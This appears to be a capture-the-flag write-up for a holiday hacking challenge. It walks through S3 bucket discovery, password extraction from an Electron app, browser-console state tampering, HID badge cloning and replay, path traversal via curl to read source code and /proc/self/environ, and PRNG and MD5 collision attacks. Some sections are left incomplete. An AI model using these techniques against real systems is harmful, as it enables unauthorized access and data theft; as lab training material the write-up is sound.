# Objective 2
## Investigate S3 Bucket
### Objective text: 
When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.

#### Motd text:
Can you help me? Santa has been experimenting with new wrapping technology, and
we've run into a ribbon-curling nightmare!
We store our essential data assets in the cloud, and what a joy it's been!
Except I don't remember where, and the Wrapper3000 is on the fritz!

Can you find the missing package, and unwrap it all the way?

Hints: Use the file command to identify a file type. You can also examine
tool help using the man command. Search all man pages for a string such as
a file extension using the apropos command.

To see this help again, run cat /etc/motd.

### Solution:
Since the word Wrapper3000 was mentioned in the motd was it added to the bucket list.
Then the bucket_finder.rb script was ran and revealed the following open bucket:

Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )
        <Public> http://s3.amazonaws.com/wrapper3000/package
 
The package is unpacked in two parts.

First part was done using cyberchef:
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Unzip('',false)Bzip2_Decompress(false)Untar()From_Hexdump()&input=VUVzREJBb0FBQUFBQUlBd2hGRWJSVDhhbndFQUFKOEJBQUFjQUJ3QWNHRmphMkZuWlM1MGVIUXVXaTU0ZWk1NGVHUXVkR0Z5TG1KNk1sVlVDUUFEb0JmS1g2QVh5bDkxZUFzQUFRVDJBUUFBQkJRQUFBQkNXbWc1TVVGWkpsTloya3RpdndBQkh2K1EzaEFTZ0dTbi8vQXZCeER3Zi94ZTBnUUFBQWd3QVZta1lSVEtlMVBWTTlVMGVrTWcycG9BQUFHZ1BVUFVHcWVoaENNU2dhQm9BRDFOTkFBQUF5RW1KcFI1UUdnMGJTUFUvVkEwZW85SWFIcUJreHcyWVpLMk5VQVNPZWdESXp3TVhNSEJDRkFDZ0lFdlEySnJnOFY1MHREamg2MVB0M1E4Q21ncEZGdW5jMUlwdWkrU3FzWUIwNE0vZ1dLS2MwVnMyRFhremVKbWlrdElOcWpvM0pqS0FBNGRMZ0x0UE4xNW9BRExlODB0bmZMR1hoSVdhSk1pRWVTWDk5MnV4b2RSSjZFQXpJRnpxU2JXdG5OcUNURURNTDlBSzdISFN6eXlCWUt3Q0ZCVkpoMTdUNjM2YTZZZ3lqWDBlRTBJc0NiamNCa1JQZ2tLejZxMG9rYjFzV2ljTWFreTJNZ3NxdzJuVW01YXlQSFVlSWt0bkJJdmtpVVd4WUVpUnM1bkZPTThNVGs4U2l0VjdsY3hPS3N0MlFlZFN4Wjg1MWNlRFFleHNMc0ozQzg5Wi9nUTZYbjZLQktxRnNLeVRrYXFPKzFGZ21JbXRIS29Ka01jdGQyQjlKa2N3dk1yK2hXSUVjSVFqQVpHaFNLWU5QeEhKRnFKM3QzMlZqZ24vT0dkUUppSUh2NHU1SXB3b1NHMGxzVitVRXNCQWg0RENnQUFBQUFBZ0RDRVVSdEZQeHFmQVFBQW53RUFBQndBR0FBQUFBQUFBQUFBQUtTQkFBQUFBSEJoWTJ0aFoyVXVkSGgwTGxvdWVIb3VlSGhrTG5SaGNpNWllakpWVkFVQUE2QVh5bDkxZUFzQUFRVDJBUUFBQkJRQUFBQlFTd1VHQUFBQUFBRUFBUUJpQUFBQTlRRUFBQUFB

The result of this was downloaded and then moved to part 2.

Second part was done using the terminal running the following commands:
{% highlight bash %}
$ mv download.dat download.dat.xz
$ unxz download.dat.xz 
$ mv download.dat download.dat.gz
$ cat download.dat 
North Pole: The Frostiest Place on Earth
{% endhighlight %}

The output of the cat command is the solution for the objective.

# Objective 3
## Point-of-Sale Password Recovery
### Objective text: 
Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?

The POS application is an electron app. The app is unpacked using 7z. See the following commands for how the password was found:
{% highlight bash %}
$ 7z x ../santa-shop.exe
$ cd \$PLUGINSDIR/
$ 7z x app-64.7z
$ cd resources/
$ strings app.asar | less
const SANTA_PASSWORD = 'santapass';
{% endhighlight %}

The password is found to be santapass


# Objective 4
## Operate the Santavator
### Objective text:
Talk to Pepper Minstix in the entryway to get some hints about the Santavator.

There is more than one way to solve this. One way is to find all the items scattered across the castle. Another way is to do a bit of browser magic.

### Solutions:
Using the first method can it be a good idea to disable other players to make it easier to spot the stuff.

Another way is to use the javascript console in the browser.

First stop the simulation by overwriting the render function:
{% highlight javascript %}
render = undefined
{% endhighlight %}
Then power on all buttons:
{% highlight javascript %}
document.querySelectorAll('button').forEach(function (b) { console.log(b); b.classList += ' powered'})
{% endhighlight %}
Add the workshop button
{% highlight javascript %}
tokens.push("workshop-button")
btn15img.classList.add('found');
{% endhighlight %}
Last add yourself to be santa at all times:
{% highlight javascript %}
tokens.push('besanta')
{% endhighlight %}

Now you can use all buttons.

# Objective 5
## Open HID Lock
### Objective text:
Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.

### Solution:
Use the command from the hints.
Move around the castle and use the following command standing near each of the elfs:
lf hid read
This will read their card if they have one.

This will get you the following from the following elfs:

{% highlight bash %}
Noel Boetie
#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020

Ginger Breddie
#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022

Sparkle Redberry
#db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022

#db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024

Bow Ninecandle
#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023

Now move to the workshop door and run the following commands:

lf hid sim -r 2006e22f08
lf hid sim -r 2006e22f0d
lf hid sim -r 2006e22f31
lf hid sim -r 2006e22f10
lf hid sim -r 2006e22f0e <-- right tag
{% endhighlight %}

The door is now open.

{% endhighlight %}



# Objective 8
## Broken Tag Generator
### Objective text:
Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.

### Solution:
By looking in the source code can it be seen that if you upload an image will it get an url that looks like this:
{% highlight bash %}
https://tag-generator.kringlecastle.com/image?id=c7919061-66cc-497a-b23c-8efb9175c313.png
{% endhighlight %}

Trying to see if it is possible to include any file can the source code for the application be fetched using:
{% highlight bash %}
curl "https://tag-generator.kringlecastle.com/image?id=../../../../app/lib/app.rb" > app.rb
{% endhighlight %}

The environment can be read from the /proc/self/environ file:
{% highlight bash %}
curl "https://tag-generator.kringlecastle.com/image?id=../../../../proc/self/environ" --output -
{% endhighlight %}

The environment is:
{% highlight bash %}

# Objective 11a
## Naughty/Nice List with Blockchain Investigation Part 1
### Objective text: 
Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex hash)

### Solution:
The blockchain uses a 64 bit integer from pythons random module. Pythons random module use the mt19937 mersenne twister. The twister only returns 32 bit integers. The nonces is 64-bit.

By extracting the nonces and splitting it two to 32 bit integers and put it in a file and used as input.

The code to split the nonces:
{% highlight python %}
    for block in c2.blocks:
        a = block.nonce & 0xFFFFFFFF
        b = (block.nonce & (0xFFFFFFFF << 32) ) >> 32
        print(a)
        print(b)
{% endhighlight %}


By using 624 values from the twister can the next values be predicted.

Using the software from this github repos: https://github.com/kmyk/mersenne-twister-predictor can the next values be predicted. Using the following commands will give the values for the nonces in the future:

{% highlight bash %}
$ python3 naughty_nice_verify.py > all_lo_hi.txt
$ head -n 624 /mnt/chromeos/MyFiles/ctf/sans_2020/OfficialNaughtyNiceBlockchainEducationPack/all_lo_hi.txt > known2.txt
$ tail -n +625 all_lo_hi.txt > correct2.txt
$ cat known2.txt | ./mt19937predict | head -n 2480 > predicted2.txt
$ diff predicted2.txt correct2.txt

{% endhighlight %}

The solution is the value: 57066318f32f729d

# Objective 11b
## Naughty/Nice List with Blockchain Investigation Part 2
### Objective text:
The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?

### Solution:
Used the following to dump all blocks as files:
{% highlight python %}
    for i in range(len(c2.blocks)):
        c2.save_a_block(i,f'{i}_{c2.blocks[i].index}_block.dat')
{% endhighlight %}
Found the correct block using grep:
{% highlight bash %}
$ sha256sum * | grep 58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f
58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f  1010_129459_block.dat
{% endhighlight %}

Now we need to identify the bytes that need to be changed.

First is the pdf to show the correct message

{% highlight bash %}
$ strings 129459.pdf | grep -iE "kids|catalog"
<</Type/Catalog/_Go_Away/Santa/Pages 2 0 R      0
<</Type/Pages/Count 1/Kids[23 0 R]>>
<</Type/Pages/Count 1/Kids[15 0 R]>>
{% endhighlight %}

This shows that there are two documents, but the parent document only points to one.

The other byte we need to change is the nice flag.

If we change some bytes we will need to change the byte which are 64 bytes further in the file due to md5 working with block sizes of 64 bytes.

That gives we need to change the following values:
{% highlight bash %}
Adr     OldVal  NewVal
0x049   0x31    0x30 The nice flag
0x89    0xd6    0xd7  Value to change since we changed the nice flag 
0x109   0x32    0x33 Point the pdf to the correct document
0x149   0x1c    0x1b Value to change since we changed the pdf
{% endhighlight %}

This gives the solution:
fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb
